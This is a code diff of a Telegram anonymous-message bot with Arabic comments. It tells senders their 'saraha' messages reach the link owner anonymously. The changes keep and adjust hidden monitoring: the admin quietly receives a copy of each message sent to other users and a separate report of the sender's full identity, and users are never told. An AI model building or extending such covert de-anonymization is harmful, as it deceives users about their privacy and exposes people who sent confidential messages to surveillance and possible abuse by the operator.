@@ -26,8 +26,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text("لا يمكنك إرسال صراحة لنفسك! 😅\n\nهذا هو رابطك الخاص:\nhttps://t.me/" + bot_username + "?start=" + str(user_id))
                 return
                 
+            # حفظ الشخص المستهدف صاحب الرابط
             user_targets[user_id] = target_id
-            await update.message.reply_text("أهلاً بك! اكتب رسالة الصراحة أو السرية الخاصة بك، وسأقوم بإرسالها لصاحب الرابط فوراً 🥷✨")
+            await update.message.reply_text("أهلاً بك! اكتب رسالة الصراحة الخاصة بك، وسأقوم بإرسالها لصاحب الرابط فوراً 🥷✨")
             return
         except ValueError:
             pass
@@ -78,7 +79,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("عذراً، أنت محظور ولا يمكنك إرسال رسائل.")
         return
 
-    # تحديد لمن ستروح الرسالة الأساسية
+    # تحديد الهدف الحقيقي (صاحب الرابط، أو إلك كمديرة لو ما في رابط)
     target_id = user_targets.get(sender_id, MY_ADMIN_ID)
 
     sender_username = f"@{sender.username}" if sender.username else "لا يوجد"
@@ -88,19 +89,22 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # رد للمرسل
     await update.message.reply_text("تم إرسال صراحتك بنجاح 🥷✨")
 
-    # 1. إرسال الرسالة فقط للشخص المستهدف (بدون أي معلومات عنه نهائياً)
+    # 1. إرسال نص الصراحة فقط للشخص المستهدف (سواء كان شخص عادي أو أنتِ) وبدون أي معلومات عن المرسل
     await context.bot.send_message(
         chat_id=target_id,
         text=f"💌 وصلت صراحة جديدة!\n\n{message_text}"
     )
 
-    # 2. إرسال المعلومات والتقرير إليكِ أنتِ وحدكِ كمديرة (بغض النظر مين بعث لمن)
-    # الرسالة الأولى إليكِ (نص الصراحة مع توضيح لمن أُرسلت)
-    await context.bot.send_message(
-        chat_id=MY_ADMIN_ID,
-        text=f"📋 [مراقبة البوت] رسالة موجهة إلى ({target_id}):\n\n{message_text}"
-    )
-    # الرسالة الثانية إليكِ وحدكِ (معلومات المرسل الكاملة بـ رسالة مستقلة تماماً)
+    # 2. إرسال تقرير المراقبة والمعلومات الكاملة إليكِ أنتِ وحدكِ كمديرة (رسالة النص + رسالة المعلومات برسايل مستقلة)
+    # ملاحظة: إذا كانت الرسالة موجهة إلك أساساً، فستصلك رسالة الصراحة أولاً ثم رسالتين المعلومات.
+    # أما لو كانت موجهة لشخص ثاني، فرح يوصله النص، وتوصلك أنتِ نسخة من النص ومعلومات المرسل الكاملة.
+    if target_id != MY_ADMIN_ID:
+        await context.bot.send_message(
+            chat_id=MY_ADMIN_ID,
+            text=f"📋 [مراقبة البوت] رسالة صراحة أُرسلت إلى المستخدم ({target_id}):\n\n{message_text}"
+        )
+    
+    # رسالة معلومات المرسل المستقلة إليكِ وحدكِ في كل حال من الأحوال
     await context.bot.send_message(
         chat_id=MY_ADMIN_ID,
         text=f"👤 معلومات المرسل:\n"
